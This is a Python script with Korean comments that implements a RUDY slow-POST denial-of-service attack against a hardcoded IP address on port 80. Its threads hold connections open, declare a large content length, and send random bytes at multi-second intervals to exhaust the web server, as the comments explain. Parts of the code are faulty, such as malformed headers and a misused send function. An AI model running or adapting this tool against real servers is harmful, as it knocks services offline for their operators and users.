import tkinter
from tkinter import *
from scapy.all import *
from threading import Thread
import socket
import sys
import time
import string
import random
ip='112.186.153.6'
p=80
t=2

useragents=[ "User-agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
            "Accept-language: en-US,en"
             ]
class http_rudy(Thread):            #쓰레드를 오버라이딩해준다.
    def __init__(self,host,port):   
        Thread.__init__(self)       #오버라이딩하고나서 init을 붙여서 쓰레드를 활용한다.
        self.host=host
        self.port=port
        self.count=0
        self.running=True
    def run(self):                  #소켓생성 및 패킷을 보낼 함수를 작성한다.
        while self.running:
            try:
                print("packet send {}".format(str(self.count)))



                self.socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  # socket 생성
                self.socks.connect((self.host, self.port))  # ip 라는 인자값에 담긴 IP와 연결하고 80번 포트로 연결
            #post 방식으로 body에 byte로 변환해서 생성된 소켓과 같이 보낸다.
                send(bytes("Post /http/1.1\r\n", encoding="utf-8"))
                send(
                    bytes("Host {}\r\n".format(self.host).encode("utf-8")))  
                send(bytes("User-agent {}\r\n".format(random.choice(useragents)).encode("utf-8"))) # headers에 저장 되어있는 값을 인코딩 utf-8 로 번역해서 보낸다.
                send(bytes("connection Keep-alive\r\n", encoding="utf-8"))
                send(bytes("Keep-alive 900\r\n", encoding="utf-8"))
                send(bytes("content Length 10000\r\n",encoding="utf-8")) #길이가 긴 것 처럼 착각하게 만들어 혼란을 준다.
                send(bytes("Content type application/x-www-form-urlencoded\r\n\r\n", encoding="utf-8"))
                for i in range(0,9000):                     #실질적인 공격문작성
                    Random = random.choice(string.ascii_letters+string.digits).encode('utf-8')
                    self.socks.send(Random)
                    time.sleep(random.uniform(0.1,3))       #0.1초에서 3초사이에 느린 속도로 천천히 보내준다.
                                                            #그럼 세션이 연결된 상태에서 byte가 천천히 오기때문에 웹서버는 기다려야한다.
                self.count+=1                               #기다리는 동안 꾸준히 for문을 통해 패킷을 보내준다.
                self.socks.close()                          
                self.run()
            except socket.error:                            #서버가 자원고갈이 되었을 경우 소켓에러가 난다.
                print('Error,restart')
                self.run()


def imfo():
   global ip ,p ,t
   return ip , p , t
def arg_user():
    print("-i")
    print("-p")
    print("-t")

if __name__ == '__main__':
    args=imfo()         #ip, port , Thread(갯수)를 불러오는 함수를 변수에 저장
    #print(args)
    if args[0]:         #0번째 IP를 저장
        host=args[0]
    if args[1]:         #1번째 port번호를 저장
        port=args[1]
    if args[2]:         #2번째 스레드 갯수를 저장
        threads=args[2]
for rudy in range(threads):
    rudy = http_rudy(host,port)     #http_rudy객체를 host와port에 같이 보내서 호출
    rudy.start()
